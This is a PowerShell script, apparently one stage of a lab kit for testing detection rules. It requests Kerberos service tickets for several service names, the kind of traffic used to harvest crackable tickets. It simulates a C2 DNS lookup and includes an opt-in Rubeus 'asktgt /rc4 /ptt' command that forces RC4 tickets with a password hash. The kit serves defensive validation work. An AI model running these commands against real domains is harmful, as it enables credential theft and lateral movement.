<#
    Stage 4 (MIDDLE) - Weak (RC4) Kerberos TGT
    ==========================================
    Requesting service tickets with legacy RC4 (etype 23) encryption yields
    weakly-encrypted, crackable tickets - a downgrade that also shows in a weak
    TGT response.

      EAL alert : 'Weakly-Encrypted Kerberos TGT Response'  (rule - ITDR)
      ATT&CK    : Credential Access (TA0006) /
                  Modify Authentication Process: DC Authentication (T1556.001)
#>
param([switch]$DryRun, [switch]$EnableRealExploits)
. "$PSScriptRoot\..\config\lab-config.ps1"
. "$PSScriptRoot\_net.ps1"
. "$PSScriptRoot\_exploit.ps1"
$cfg = $Global:EalDemo
if ($DryRun) { $cfg.DryRun = $true }
if ($EnableRealExploits) { $cfg.EnableRealExploits = $true }

Write-Stage "STAGE 4 (Cred Access): RC4 Kerberos ticket requests to $($cfg.DomainController)" "INFO"
Add-Type -AssemblyName System.IdentityModel -ErrorAction SilentlyContinue
$spns = @("HOST/$($cfg.DomainController)", "CIFS/$($cfg.DomainController)", "LDAP/$($cfg.DomainController)",
          "MSSQLSvc/db01.$($cfg.Domain):1433", "HTTP/web01.$($cfg.Domain)")
foreach ($spn in $spns) {
    if ($cfg.DryRun) { Write-Host "  DRY: TGS (RC4) for $spn"; continue }
    try { $t = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
          Write-Stage "  requested ticket for $spn" "OK" }
    catch { Write-Stage "  ticket request for $spn generated Kerberos traffic: $($_.Exception.Message)" "WARN" }
    Start-Sleep -Milliseconds $cfg.DelayBetweenReqMs
}
Write-Stage "  Tip: 'klist' shows cached tickets; etype 23 (RC4) is the weak one." "INFO"
# Firewall anchor: the kerberoast tool exfils tickets to C2.
Invoke-TestDns -Category "c2"

# --- OPT-IN real RC4 downgrade (operator tool only) ------------------------
# The native TGS requests above generate Kerberos traffic but do NOT force the
# RC4 (etype 23) encryption the 'Weakly-Encrypted Kerberos TGT Response' rule
# keys on. Rubeus with /rc4 forces that weak etype, firing the exact detector.
# NOTE: <user>/<rc4hash> are OPERATOR SECRETS - do NOT hardcode. The operator
# edits the two placeholders below (or supplies them) before enabling this, and
# drops Rubeus.exe in scripts\tools\. Real exploit runs only with both.
Invoke-RealExploit -Name 'RC4 Kerberos downgrade' -ToolCandidates @('Rubeus.exe') `
    -TrafficNote 'Native TGS requests were sent (etype not forced).' `
    -Run { param($t) & $t asktgt /user:<user> /rc4:<rc4hash> /domain:$($cfg.Domain) /dc:$($cfg.DomainController) /ptt }

Write-Stage "STAGE 4 done. Expect FW NGFW: DNS-Security C2 + (ITDR/baseline) EAL 'Weakly-Encrypted Kerberos TGT Response'." "OK"
